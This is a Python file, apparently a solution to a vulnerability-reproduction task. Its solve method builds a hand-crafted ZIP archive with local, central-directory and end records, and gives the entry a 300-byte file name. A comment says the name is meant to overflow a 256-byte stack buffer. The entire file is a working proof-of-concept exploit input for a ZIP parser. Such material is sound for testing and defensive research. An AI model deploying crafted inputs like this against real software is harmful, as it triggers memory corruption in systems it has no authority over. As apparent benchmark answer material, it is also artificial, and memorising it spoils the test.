import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Filename longer than the vulnerable 256-byte stack buffer
        filename_len = 300
        fname = b"A" * filename_len
        fn_len = len(fname)

        # DOS time/date for 00:00:00, 1980-01-01
        dos_time = 0
        dos_date = 33  # (1980-1980)*512 + 1*32 + 1

        # Local file header
        local_header = struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,  # Local file header signature
            20,          # Version needed to extract
            0,           # General purpose bit flag
            0,           # Compression method (store)
            dos_time,    # Last mod file time
            dos_date,    # Last mod file date
            0,           # CRC-32 (0 for empty file)
            0,           # Compressed size
            0,           # Uncompressed size
            fn_len,      # File name length
            0,           # Extra field length
        ) + fname

        # Central directory file header
        central_header = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50,  # Central file header signature
            20,          # Version made by
            20,          # Version needed to extract
            0,           # General purpose bit flag
            0,           # Compression method
            dos_time,    # Last mod file time
            dos_date,    # Last mod file date
            0,           # CRC-32
            0,           # Compressed size
            0,           # Uncompressed size
            fn_len,      # File name length
            0,           # Extra field length
            0,           # File comment length
            0,           # Disk number start
            0,           # Internal file attributes
            0,           # External file attributes
            0,           # Relative offset of local header
        ) + fname

        cd_size = len(central_header)
        cd_offset = len(local_header)

        # End of central directory record
        end_of_cd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,  # End of central dir signature
            0,           # Number of this disk
            0,           # Disk where central directory starts
            1,           # Number of central directory records on this disk
            1,           # Total number of central directory records
            cd_size,     # Size of central directory (bytes)
            cd_offset,   # Offset of start of central directory
            0,           # ZIP file comment length
        )

        return local_header + central_header + end_of_cd